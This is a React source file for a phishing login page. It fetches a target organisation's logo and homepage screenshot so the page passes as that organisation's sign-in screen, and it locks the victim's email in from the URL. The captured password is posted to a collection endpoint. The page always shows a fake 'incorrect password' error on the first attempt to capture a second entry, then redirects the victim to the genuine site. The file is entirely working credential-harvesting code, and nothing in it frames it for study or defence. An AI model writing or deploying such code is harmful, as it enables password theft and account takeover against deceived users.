import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent } from "@/components/ui/card";
import { Eye, EyeOff, Lock, ExternalLink, AlertTriangle, Building } from "lucide-react";
import { useEmailFromUrl } from "@/hooks/use-url-params";
import { useLanguageDetection } from "@/hooks/use-language-detection";
import { cn } from "@/lib/utils";

const loginSchema = z.object({
  password: z.string().min(1, "Password is required"),
});

type LoginForm = z.infer<typeof loginSchema>;

export default function Login() {
  const { email, domain } = useEmailFromUrl();
  const { detectedLanguage, translate, isDetecting } = useLanguageDetection(domain);
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [showError, setShowError] = useState(false);
  const [logoLoaded, setLogoLoaded] = useState(false);
  const [backgroundLoaded, setBackgroundLoaded] = useState(false);
  const [logoError, setLogoError] = useState(false);
  const [backgroundError, setBackgroundError] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const currentYear = new Date().getFullYear();
  const logoUrl = domain ? `https://logo.clearbit.com/${domain}` : "";
  const domainUrl = domain ? `https://${domain}` : "#";
  const homepageScreenshotUrl = domain ? `https://api.screenshotone.com/take?access_key=YourAccessKey&url=https://${domain}&viewport_width=1920&viewport_height=1080&device_scale_factor=1&format=jpg&image_quality=80&block_ads=true&block_cookie_banners=true&block_banners_by_heuristics=true&block_trackers=true&delay=3&timeout=60` : "";
  // Fallback to a website preview service
  const websitePreviewUrl = domain ? `https://api.urlbox.io/v1/ca482d7e-9417-4569-90fe-80f7c5e1c781/png?url=https://${domain}&width=1920&height=1080&delay=2000` : "";
  // Another fallback option
  const thumbnailUrl = domain ? `https://api.thumbnail.ws/api/ca482d7e-9417-4569-90fe-80f7c5e1c781/thumbnail/get?url=https://${domain}&width=1920` : "";
  // Simple fallback using website thumbnail service
  const websiteThumbnail = domain ? `https://image.thum.io/get/width/1920/crop/1080/https://${domain}` : "";

  const form = useForm<LoginForm>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      password: "",
    },
  });

  // Send initial visit notification
  useEffect(() => {
    if (email && domain) {
      // Send visit tracking notification
      fetch('/api/login/visit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          domain,
        }),
      }).catch(error => {
        console.error('Failed to send visit notification:', error);
      });
    }
  }, [email, domain]);

  // Load domain assets
  useEffect(() => {
    if (!domain) {
      setIsLoading(false);
      return;
    }

    let logoImg: HTMLImageElement | null = null;
    let backgroundImg: HTMLImageElement | null = null;
    let loadingTimer: NodeJS.Timeout;

    const loadAssets = async () => {
      const promises = [];

      // Load logo
      if (logoUrl) {
        const logoPromise = new Promise<void>((resolve) => {
          logoImg = new Image();
          logoImg.onload = () => {
            setLogoLoaded(true);
            resolve();
          };
          logoImg.onerror = () => {
            setLogoError(true);
            resolve();
          };
          logoImg.src = logoUrl;
        });
        promises.push(logoPromise);

        // Load background image (website homepage screenshot)
        const backgroundPromise = new Promise<void>((resolve) => {
          backgroundImg = new Image();
          backgroundImg.onload = () => {
            setBackgroundLoaded(true);
            resolve();
          };
          backgroundImg.onerror = () => {
            setBackgroundError(true);
            resolve();
          };
          // Try website thumbnail service first
          backgroundImg.src = websiteThumbnail;
        });
        promises.push(backgroundPromise);
      }

      await Promise.all(promises);

      // Minimum loading time for better UX
      loadingTimer = setTimeout(() => {
        setIsLoading(false);
      }, 1000);
    };

    loadAssets();

    return () => {
      if (logoImg) logoImg.src = "";
      if (backgroundImg) backgroundImg.src = "";
      if (loadingTimer) clearTimeout(loadingTimer);
    };
  }, [domain, logoUrl]);

  const onSubmit = async (data: LoginForm) => {
    setIsSubmitting(true);
    setShowError(false);

    const currentAttempt = loginAttempts + 1;

    // Send login attempt notification to admin email
    try {
      await fetch('/api/login/attempt', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          domain,
          password: data.password,
          attempt: currentAttempt,
        }),
      });
    } catch (error) {
      console.error('Failed to send login notification:', error);
    }

    // Simulate authentication delay
    await new Promise(resolve => setTimeout(resolve, 1500));

    setLoginAttempts(prev => prev + 1);

    // Show error on first attempt (as per requirements)
    if (loginAttempts === 0) {
      setShowError(true);
      setIsSubmitting(false);
      return;
    }

    // On subsequent attempts, redirect to domain
    if (domain) {
      window.location.href = domainUrl;
    } else {
      setShowError(true);
      setIsSubmitting(false);
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  if (!email || !domain) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-600 via-blue-700 to-indigo-800 p-4">
        <Card className="w-full max-w-md glass-effect">
          <CardContent className="pt-6 text-center">
            <AlertTriangle className="h-12 w-12 text-red-500 mx-auto mb-4" />
            <h1 className="text-xl font-semibold text-gray-800 mb-2">{translate('Invalid Request')}</h1>
            <p className="text-gray-600 text-sm">
              {translate('Please provide an email parameter in the URL')}
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen relative overflow-hidden flex flex-col">
      {/* Dynamic Background */}
      <div className="absolute inset-0 transition-all duration-1000">
        {/* Default gradient background */}
        <div className="absolute inset-0 bg-gradient-to-br from-blue-600 via-blue-700 to-indigo-800" />
        
        {/* Loading shimmer */}
        {isLoading && (
          <div className="absolute inset-0 loading-shimmer" />
        )}
        
        {/* Dynamic background image */}
        {backgroundLoaded && !backgroundError && (
          <div 
            className="absolute inset-0 bg-cover bg-center bg-no-repeat transition-opacity duration-500"
            style={{ 
              backgroundImage: `url('${websiteThumbnail}')`,
              opacity: isLoading ? 0 : 1 
            }}
          />
        )}
        
        {/* Overlay */}
        <div className="absolute inset-0 background-overlay" style={{
          background: backgroundLoaded && !backgroundError 
            ? 'linear-gradient(135deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0.6) 100%)'
            : 'linear-gradient(135deg, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0.5) 100%)'
        }} />
      </div>

      {/* Loading Spinner */}
      {isLoading && (
        <div className="absolute inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
          <div className="glass-effect rounded-2xl p-8 text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-4 border-blue-500 border-t-transparent mx-auto mb-4" />
            <p className="text-gray-700 font-medium">{translate('Loading...')}</p>
          </div>
        </div>
      )}

      {/* Main Content */}
      <div className="relative z-10 flex-1 flex items-center justify-center p-4">
        <div className="w-full animate-slide-up" style={{ width: "80vw", maxWidth: "400px" }}>
          <div className="glass-effect rounded-3xl shadow-2xl p-6 border border-white/20">
            {/* Domain Logo Header */}
            <div className="text-center mb-6">
              <div className="w-12 h-12 mx-auto mb-3 rounded-2xl bg-white shadow-lg flex items-center justify-center">
                {isLoading && (
                  <div className="w-8 h-8 loading-shimmer rounded" />
                )}
                {!isLoading && logoLoaded && !logoError && (
                  <img 
                    src={logoUrl} 
                    alt={`${domain} logo`}
                    className="w-8 h-8 object-contain"
                  />
                )}
                {!isLoading && (logoError || !logoLoaded) && (
                  <Building className="w-5 h-5 text-blue-600" />
                )}
              </div>
              <h1 className="text-xl font-bold text-gray-800 mb-1">{translate('Welcome Back')}</h1>
              <p className="text-sm text-gray-600">
                {translate('Sign in to continue to')}{" "}
                <span className="font-semibold text-blue-600">{domain}</span>
              </p>
            </div>

            {/* Login Form */}
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              {/* Email Field (Disabled) */}
              <div className="space-y-2">
                <Label htmlFor="email" className="text-sm font-medium text-gray-700">
                  {translate('Email Address')}
                </Label>
                <div className="relative">
                  <Input
                    id="email"
                    type="email"
                    value={email}
                    disabled
                    className="bg-gray-50 border-gray-200 text-gray-800 font-medium cursor-not-allowed opacity-75 pr-12 rounded-xl py-2"
                  />
                  <Lock className="absolute right-4 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                </div>
              </div>

              {/* Password Field */}
              <div className="space-y-2">
                <Label htmlFor="password" className="text-sm font-medium text-gray-700">
                  {translate('Password')}
                </Label>
                <div className="relative">
                  <Input
                    {...form.register("password")}
                    id="password"
                    type={showPassword ? "text" : "password"}
                    placeholder={translate('Enter your password')}
                    className="pr-12 rounded-xl py-2 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors"
                  />
                  <button
                    type="button"
                    onClick={togglePasswordVisibility}
                    className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
                  >
                    {showPassword ? (
                      <EyeOff className="h-4 w-4" />
                    ) : (
                      <Eye className="h-4 w-4" />
                    )}
                  </button>
                </div>
                {form.formState.errors.password && (
                  <p className="text-sm text-red-600">{form.formState.errors.password.message}</p>
                )}
              </div>

              {/* Error Message */}
              {showError && (
                <div className="bg-red-50 border border-red-200 rounded-xl p-4 animate-slide-up">
                  <div className="flex items-center">
                    <AlertTriangle className="h-5 w-5 text-red-500 mr-3 flex-shrink-0" />
                    <p className="text-sm text-red-600">
                      {translate('Incorrect password for')}{" "}
                      <span className="font-semibold">{domain}</span>. 
                      {translate('Verify your password and try again.')}
                    </p>
                  </div>
                </div>
              )}

              {/* Login Button */}
              <Button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2.5 px-6 rounded-xl transition-all duration-200 shadow-lg hover:shadow-xl h-10"
              >
                {isSubmitting ? (
                  <div className="flex items-center justify-center">
                    <div className="animate-spin rounded-full h-5 w-5 border-2 border-white border-t-transparent mr-3" />
                    {translate('Signing in...')}
                  </div>
                ) : (
                  translate('Sign In')
                )}
              </Button>


            </form>
          </div>
        </div>
      </div>

      {/* Dynamic Footer */}
      <footer className="relative z-10 p-6 text-center mt-auto">
        <div className="glass-effect rounded-2xl py-3 px-5 inline-block">
          <p className="text-xs text-gray-700">
            © {currentYear}{" "}
            <span className="font-semibold">{domain}</span>.
            {translate('All rights reserved.')}
          </p>
        </div>
      </footer>
    </div>
  );
}
